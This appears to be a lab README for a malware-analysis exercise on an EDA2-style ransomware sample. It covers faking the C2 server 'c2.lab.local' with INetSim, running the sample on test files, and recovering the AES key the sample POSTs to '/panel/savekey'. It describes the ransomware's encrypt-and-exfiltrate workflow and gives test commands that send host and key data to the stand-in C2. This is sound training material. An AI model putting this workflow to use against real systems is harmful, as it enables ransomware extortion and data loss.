
# A01.4 `C#` EDA2 Variant: Local Encryption + Key Exfil to C2

## Summary

A01_4 demonstrates a hybrid ransomware workflow based on the EDA2 design.

The specimen:

- Downloads an RSA-2048 public key from `c2.lab.local`
- Generates a random 32-character AES key
- Encrypts files using AES-256
- Encrypts the AES key using the downloaded RSA public key
- Sends the encrypted AES key to `/panel/savekey`
- Downloads a ransom image
- Sets the wallpaper
- Exits

The plaintext AES key is intentionally written to:

`C:\Users\Public\A01_4_Lab_Encryption_Key.txt`

for laboratory validation only.

---

## Laboratory Setup

### 1. Generate the RSA Key Pair

Generate the RSA key pair before creating the INetSim HTTP mappings.

The public key served by INetSim and the private key used for laboratory recovery must belong to the same RSA-2048 key pair.

The sample expects the public key in the legacy .NET XML format consumed by:

```text
RSACryptoServiceProvider.FromXmlString()
```

[Run the utility for generating a RSA private/public key pair](https://github.com/misha-kurtz/Reverse-Engineering/tree/main/A01-Ransomware-Cryptor/A01_4/utilities/gen_RSA_keypair)

The script creates:

```text
A01_4_private_key.xml
A01_4_public_key.xml
```

The public-key file should contain only:

```xml
<RSAKeyValue>
  <Modulus>BASE64_MODULUS</Modulus>
  ...
  <Exponent>AQAB</Exponent>
</RSAKeyValue>
```

The private-key file additionally contains the private RSA parameters required for decryption.

Protect the private key carefully. Place it in the key decryption utility directory for decrypting the AES key later:

```text
A01-Ransomware-Cryptor\A01_4\utilities\A01_4_private_key.xml
```

It must not be served by INetSim, embedded in the sample, or copied into the HTTP fake-file directory.


---

### 2. INetSim Configuration for A01_4

A01_4 requires simulated DNS and HTTP services.

The INetSim server must provide:

1. DNS resolution for:

   ```text
   c2.lab.local
   ```

2. An RSA public key at:

   ```text
   /panel/publickey
   ```

3. A successful JSON response for:

   ```text
   /panel/savekey
   ```

4. A JPEG ransom-note image at:

   ```text
   /panel/ransomnote

### 3. Configure INetSim DNS

Configure the simulated DNS domain and server address:

```text
dns_default_ip 192.168.67.5
dns_default_domainname lab.local
```

Make sure requests for:

```text
c2.lab.local
```

resolve to:

```text
192.168.67.5
```

---

### 4. Install HTTP Fake Files

The fake response files are stored beneath:

```text
/var/lib/inetsim/http/fakefiles/
```

Create the required files:

```text
/var/lib/inetsim/http/fakefiles/publickey.xml
/var/lib/inetsim/http/fakefiles/savekey_OK.json
/var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

Copy only the RSA public key to the INetSim server to be served at the ransomware's request:

```bash
sudo cp A01_4_public_key.xml \
    /var/lib/inetsim/http/fakefiles/publickey.xml
```

Create the JSON response returned by the key-exfil endpoint:

```bash
cat /var/lib/inetsim/http/fakefiles/savekey_OK.json
{"status":"ok","task":"Saved encrypted AES key"}
```

Place the [PNG ransomnote image](https://github.com/misha-kurtz/Reverse-Engineering/blob/main/A01-Ransomware-Cryptor/A01_4/A01_4_ransomnote.png) at:

```text
/var/lib/inetsim/http/fakefiles/A01_4_ransomnote.png
```

---

### 5. Configure HTTP Mappings in `/etc/inetsim/inetsim.conf`

```text
http_fakemode YES

http_static_fakefile /panel/publickey publickey.xml text/xml
http_static_fakefile /panel/savekey savekey_OK.json application/json
http_static_fakefile /panel/ransomnote A01_4_ransomnote.jpg image/jpeg
```


These mappings cause INetSim to return different controlled content for the three endpoint paths.

The paths must exactly match the URLs hardcoded in the sample:

```text
/panel/publickey
/panel/savekey
/panel/ransomnote
```

After updating the configuration, restart INetSim:

```bash
sudo systemctl restart inetsim
```

---

### 6. Verify Endpoints Prior to Executing Sample

Verify correct Inetsim responses before executing sample:

- GET `/panel/publickey`
- POST `/panel/savekey`
- GET `/panel/ransomnote`


From the INetSim server, confirm the files exist:

```bash
ls -l \
    /var/lib/inetsim/http/fakefiles/publickey.xml \
    /var/lib/inetsim/http/fakefiles/savekey_OK.json \
    /var/lib/inetsim/http/fakefiles/A01_4_ransomnote.jpg
```

From the Windows analysis VM, retrieve the public key:

```powershell
curl http://c2.lab.local/panel/publickey
```

Confirm the response matches the RSA public key. 

Test the key-exfil endpoint:

```powershell
Invoke-WebRequest `
    -Uri http://c2.lab.local/panel/savekey `
    -Method POST `
    -Body @{
        pcname      = "TEST-PC"
        username    = "analyst"
        aesencrypted = "TEST_BASE64_VALUE"
    }
```

Expected response body:

```json
{"status":"ok","task":"Saved encrypted AES key"}
```

Test the ransom-image endpoint:

```powershell
Invoke-WebRequest `
    http://c2.lab.local/panel/ransomnote `
    -OutFile C:\Users\Public\A01_4_Test_Ransom.png
```

Confirm that the resulting file is a valid image before executing the sample.

---

### 6. Execute the Sample

**6a. Prepare Test Data**

Create:

```text
C:\Users\Public\A01_TestData
```

Populate with representative test documents.

**6b. Execute the sample**

```powershell
.\A01-Ransomware-Cryptor\A01_4\bin\A01_4_EDA2_Key_Exfiltration.exe
```

---

## Expected Artifacts & Logs

Recover exfiltrated encrypted AES key from one of the following:

* INetSim service logs `/var/log/inetsim/service.log`
* A packet capture
* An HTTP request capture generated by another laboratory sensor


### Filesystem

- `.locked` files
- `C:\Users\Public\A01_4_Lab_Encryption_Key.txt`
- `C:\Users\<user>\ransom.jpg`


### DNS Activity

The sample should generate DNS queries for:

```text
c2.lab.local
```

### HTTP Requests

Expected request sequence:

```text
GET  /panel/publickey
POST /panel/savekey
GET  /panel/ransomnote
```

### Expected POST Body Structure

The exact RSA-encrypted value changes between executions because a new AES key is generated for each run.

```text
pcname=ANALYSIS-PC&
username=analyst&
aesencrypted=<URLencoded-Base64-AES-key-encrypted-w-RSA-publickey>
```

---

## Recovering the Exfiltrated RSA-Encrypted AES Key

### 1. Capture the POST Parameter

Recover only the value of:

```text
aesencrypted
```

from the Inetsim HTTP logs or packet capture.

The value is:

1. RSA-encrypted using the public key in `publickey.xml`
2. Base64-encoded
3. URL-encoded as part of the HTTP form body

Example raw POST field:

```text
aesencrypted=AbCdEf%2B123%2F456%3D%3D
```

Save it as:

```text
posted_aesencrypted.txt
```

---

### 2. Place Required Files

Place:

```text
A01_4_private_key.xml
posted_aesencrypted.txt
```

Inside:

```text
A01-Ransomware-Cryptor/
└── A01_4/
    └── utilities/
        └── decrypt_AES_key/
```

---

### 3. Run the AES Key Decryption Utility

After placing your generated RSA private key and the POSTED encrypted AES key:

[Modify the C# AES key decryption utility file](https://github.com/misha-kurtz/Reverse-Engineering/blob/main/A01-Ransomware-Cryptor/A01_4/utilities/decrypt_AES_key/decrypt_AES_key.cs)

```c#
string privateKeyXml = File.ReadAllText("C:\\<your_filepath_here>\\A01_4_private_key.xml");

string postedValue = File.ReadAllText("C:\\<your_filepath_here>\\posted_aesencrypted.txt");

```

Run the AES key decryption utility:

```powershell
cd A01-Ransomware-Cryptor\A01_4\utilities\decrypt_AES_key
dotnet run
```

The utility automatically:

- Reads the RSA private key `A01_4_private_key.xml`
- Reads the captured POST value `posted_aesencrypted.txt`
- URL-decodes the ciphertext
- Base64-decodes the ciphertext
- Performs RSA-2048 PKCS#1 v1.5 decryption
- Writes the recovered AES key to:

```text
A01_4_Recovered_AES_Key.txt
```

---

### 4. Validate

Compare:

```text
A01_4_Recovered_AES_Key.txt
```

against

```text
C:\Users\Public\A01_4_Lab_Encryption_Key.txt
```

The values should match exactly.

---

## High-Level Workflow

```text
Generate RSA Key Pair
        │
        ▼
Configure INetSim
        │
        ▼
Execute Sample
        │
        ▼
Encrypt Files
        │
        ▼
POST RSA-encrypted AES Key
        │
        ▼
Capture aesencrypted
        │
        ▼
Run Recovery Utility
        │
        ▼
Recovered AES Key
```

---

**Purpose**

Demonstrates a hybrid ransomware cryptographic workflow in which local files are encrypted with a symmetric AES key and that key is protected with a remotely supplied RSA public key before transmission to a command-and-control server.

The specimen additionally demonstrates ransom-image delivery and desktop wallpaper modification while producing controlled filesystem, DNS, HTTP, cryptographic, and host-modification artifacts suitable for reverse engineering, dynamic malware analysis, network analysis, and retrieval-augmented generation evaluation.